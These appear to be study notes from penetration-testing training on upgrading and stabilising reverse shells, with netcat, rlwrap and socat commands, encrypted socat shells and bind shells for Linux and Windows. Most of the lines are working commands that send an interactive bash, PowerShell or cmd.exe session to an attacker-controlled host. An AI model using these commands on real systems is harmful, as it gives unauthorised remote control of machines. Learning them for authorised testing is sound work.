 python -c 'import pty;pty.spawn("/bin/bash")'
some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
Step two is: export TERM=xterm 
-- this will give us access to term commands such as clear.
Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use 
stty raw -echo; 
fg. 

This gives good control 

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

Another is rlwrap
 sudo apt install rlwrap
rlwrap nc -lvnp <port>
background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.


we can get rows and columns list to know the page size by  stty -a. 
Next, in your reverse/bind shell, type in:
stty rows <number>
and
stty cols <number>
Filling in the numbers you got from running the command in your own terminal.
This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.




Socat
Transfer the socat binary to target via a netcat session

for reverse shell:
socat TCP-L:<port> -
On Windows we would use this command to connect back:
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
for a Linux Target:
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

For Bind shell:


To connect to any waiting listener
socat TCP:<TARGET-IP>:<TARGET-PORT> -




Very stable socat listener
socat TCP-L:<port> FILE:`tty`,raw,echo=0
and now on the target machine we run 
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

we get very interactive shel







Socat Encrypted Shell
Replace TCP with OPENSSL
We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

We then need to merge the two created files into a single .pem file:
cat shell.key shell.crt > shell.pem

Now, when we set up our reverse shell listener, we use:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

To connect back, we would use:
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash


The same technique would apply for a bind shell:
Target:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

Attacker:
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -







